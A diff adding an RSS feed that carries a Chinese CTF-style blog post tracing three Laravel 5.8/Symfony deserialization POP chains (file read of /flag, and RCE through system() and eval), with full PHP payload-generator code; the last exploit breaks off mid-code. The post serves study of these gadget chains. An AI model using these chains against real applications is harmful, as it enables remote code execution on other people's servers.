@@ -1,0 +1,202 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>laravel on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/laravel/</link><description>Recent content in laravel on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 04 Dec 2021 14:11:02 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/laravel/index.xml" rel="self" type="application/rss+xml"/><item><title>Laravel-5.8.x反序列化pop链学习</title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力&lt;/p>
+&lt;p>参考链接放在文末&lt;/p>
+&lt;hr>
+&lt;h2 id="链子1---文件包含任意文件读取">链子1 - 文件包含/任意文件读取&lt;/h2>
+&lt;p>搜索&lt;code>__desturct()&lt;/code>找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
+&lt;p>它调用了&lt;code>commit()&lt;/code>和&lt;code>invalidateTags()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
+&lt;p>调用pool的&lt;code>saveDeferred()&lt;/code>方法，我们在这个类相同命名空间(Symfony\Component\Cache\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在&lt;code>saveDeferred()&lt;/code>的类&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
+&lt;p>找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
+&lt;p>它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
+&lt;p>是我们的文件包含点了，可以从这里读flag&lt;/p>
+&lt;p>接下来就是构造exp了，要注意命名空间和接口&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
+&lt;p>前两个类都是Symfony\Component\Cache\Adapter命名空间下的，但是CacheItem是Symfony\Component\Cache下的，所以要再引入它，use&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="链子2---rce">链子2 - rce&lt;/h2>
+&lt;p>回到前面在相同命名空间下找&lt;code>saveDeferred()&lt;/code>的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
+&lt;p>跟进&lt;code>doSave()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
+&lt;p>223行可以动态调用函数，&lt;code>setInnerItem&lt;/code>可控 我们可以调用&lt;code>system()&lt;/code>，接下来确认它调用的两个参数可不可控&lt;/p>
+&lt;p>对于&lt;code>$item&lt;/code>，是调用函数&lt;code>doSave()&lt;/code>函数时传入的参数，也就是&lt;code>saveDeferred()&lt;/code>时的参数，也就是我们传入的数组，可控&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
+&lt;p>对于&lt;code>$innerItem&lt;/code>有这样一个if判断&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
+&lt;p>光看这个判断肥肠的突兀，还要结合207行的&lt;code>$item = (array) $item;&lt;/code>，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 &lt;em>protected&lt;/em>的属性冲突，所以需要在相同的命名空间里接着找一个类，包含&lt;code>pollHash&lt;/code>和&lt;code>innerItem&lt;/code>属性，最终还是找到了CacheItem（前面也是它&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
+&lt;p>构造exp&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地尝试一下（懒得再开靶机了w&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
+&lt;p>成功了捏&lt;/p>
+&lt;h2 id="链子3---rce">链子3 - rce&lt;/h2>
+&lt;p>在 &lt;strong>[CISCN2019 总决赛 Day1 Web4]Laravel1&lt;/strong>这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
+&lt;p>把这个注释取消即可&lt;/p>
+&lt;p>看到它调用了&lt;code>events&lt;/code>的&lt;code>dispatch&lt;/code>方法，跟上面思路一样，接着找一个可用的别的类里的&lt;code>dispatch&lt;/code>，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
+&lt;p>看一下第一个判断的返回时调用的&lt;code>dispatchNow()&lt;/code>是什么&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
+&lt;p>150行有亮点啊，使用了&lt;code>call_user_func&lt;/code>，第一个参数可控，第二个参数来自&lt;code>$command&lt;/code>，也就是最开始找的析构函数调用的&lt;code>$this-&amp;gt;event&lt;/code>；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子&lt;/p>
+&lt;p>不过先不急，首先要满足&lt;code>dispatch()&lt;/code>中的if判断&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>，前一个可控，看看后面这个&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
+&lt;p>需要&lt;code>$command&lt;/code>必须是一个实现了&lt;code>ShouldQueue&lt;/code>接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
+&lt;p>然后接着找适合做&lt;code>call_user_func()&lt;/code>第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
+&lt;p>这个&lt;code>load()&lt;/code>可以直接调用eval执行代码，但是&lt;code>$defination&lt;/code>要满足if的判断，跟进&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
+&lt;p>需要额外再找两个类，第一个类具有&lt;code>code&lt;/code>属性，第二类又&lt;code>getName&lt;/code>函数，来作为第一个类的config属性&lt;/p>
+&lt;p>可用的第一个类就是&lt;code>getClassName()&lt;/code>所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
+&lt;p>第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
+&lt;p>总结以上的过程，写exp&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
